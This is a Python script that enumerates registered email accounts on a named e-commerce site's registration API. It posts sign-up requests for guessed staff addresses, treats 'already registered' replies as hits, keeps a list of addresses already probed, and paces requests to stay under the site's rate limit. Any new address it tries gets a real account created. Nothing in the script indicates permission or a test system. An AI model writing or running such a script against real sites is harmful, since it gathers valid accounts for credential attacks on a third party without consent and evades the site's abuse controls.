#!/usr/bin/env python3
"""
Authentication email enumeration test script.
Tests whether specific email addresses are already registered by
attempting registration and observing the response.
"""

import requests
import time
import json

TARGET = "https://shophubonline.store/api/auth/register"
HEADERS = {"Content-Type": "application/json"}
SLEEP_SECONDS = 3
MAX_REQUESTS = 7

# Emails already tested (skip these):
ALREADY_TESTED = {
    "sales@shophubonline.store",
    "manager@shophubonline.store",
    "staff@shophubonline.store",
    "dev@shophubonline.store",
    "developer@shophubonline.store",
    "moderator@shophubonline.store",
    "admin@gmail.com",
    "testuser1@shophubonline.store",
}

# New candidates to test (max 7)
CANDIDATES = [
    "support@shophubonline.store",
    "info@shophubonline.store",
    "contact@shophubonline.store",
    "owner@shophubonline.store",
    "billing@shophubonline.store",
    "orders@shophubonline.store",
    "admin2@shophubonline.store",
]

assert len(CANDIDATES) <= MAX_REQUESTS, "Too many candidates — would exceed rate limit"
# Sanity check: none of these overlap with already-tested
for c in CANDIDATES:
    assert c not in ALREADY_TESTED, f"{c} was already tested"

confirmed_existing = []
results = []

print(f"Target : {TARGET}")
print(f"Testing: {len(CANDIDATES)} emails (max {MAX_REQUESTS})")
print(f"Sleep  : {SLEEP_SECONDS}s between requests")
print("-" * 60)

for i, email in enumerate(CANDIDATES):
    payload = {
        "name": "Test User",
        "email": email,
        "password": "TestPass1"
    }

    try:
        resp = requests.post(TARGET, headers=HEADERS, json=payload, timeout=15)
        status = resp.status_code

        try:
            body = resp.json()
        except Exception:
            body = {}

        msg = body.get("message", "")

        if status == 400 and "already registered" in msg.lower():
            verdict = "EXISTING"
            confirmed_existing.append(email)
        elif status == 201:
            verdict = "NEW (account created)"
        elif status == 429:
            verdict = "RATE LIMITED — stopping"
            print(f"[{i+1}/{len(CANDIDATES)}] {email:45s}  HTTP {status}  -> {verdict}")
            results.append((email, status, verdict))
            break
        else:
            verdict = f"UNEXPECTED (msg: {msg!r})"

        print(f"[{i+1}/{len(CANDIDATES)}] {email:45s}  HTTP {status}  -> {verdict}")
        results.append((email, status, verdict))

    except requests.RequestException as exc:
        verdict = f"ERROR: {exc}"
        print(f"[{i+1}/{len(CANDIDATES)}] {email:45s}  ERROR  -> {exc}")
        results.append((email, "ERR", verdict))

    # Sleep between requests, but not after the last one
    if i < len(CANDIDATES) - 1:
        time.sleep(SLEEP_SECONDS)

print("-" * 60)
print("\nSUMMARY")
print("=======")
print(f"Emails tested this run : {len(results)}")
print(f"Confirmed EXISTING     : {len(confirmed_existing)}")
if confirmed_existing:
    for e in confirmed_existing:
        print(f"  * {e}")
else:
    print("  (none found in this batch)")

print("\nAll results:")
for email, status, verdict in results:
    print(f"  {email:45s}  HTTP {status}  {verdict}")
